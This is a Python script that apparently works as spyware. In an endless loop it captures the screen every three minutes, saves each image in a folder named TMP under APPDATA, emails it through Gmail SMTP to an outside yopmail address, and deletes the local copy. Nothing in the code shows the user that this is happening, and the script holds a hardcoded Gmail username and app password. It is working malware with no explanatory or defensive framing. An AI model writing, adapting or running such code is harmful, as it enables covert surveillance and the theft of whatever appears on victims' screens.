import pyautogui
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
import time
from datetime import datetime

appdata = os.getenv("APPDATA")
tmp_folder = os.path.join(appdata, "TMP")
if not os.path.exists(tmp_folder):
      os.makedirs(tmp_folder)

def send_email(img_path):
     try:
         to = "coytathichdapda445368@yopmail.com"
         gmail_user = "coytathichdapda445368@gmail.com"
         gmail_password = "kmzvddfytrnzfprc"

         msg = MIMEMultipart()
         msg['From'] = gmail_user
         msg['To'] = to
         msg['Subject'] = "Screenshot"

         with open(img_path, 'rb') as f:
             img_data = f.read()
             image = MIMEImage(img_data, name=os.path.basename(img_path))
             msg.attach(image)

         server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
         server.ehlo()
         server.login(gmail_user, gmail_password)
         server.sendmail(gmail_user, to, msg.as_string())
         server.close()
         print('Email sent!')
     except Exception as e:
         print(f'Something went wrong: {e}')

while True:
     now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
     screenshot = pyautogui.screenshot()
     screenshot_path = os.path.join(tmp_folder, f"screenshot_{now}.jpg")
     screenshot.save(screenshot_path, "JPEG", quality=70)
     send_email(screenshot_path)
     os.remove(screenshot_path)
     time.sleep(180)
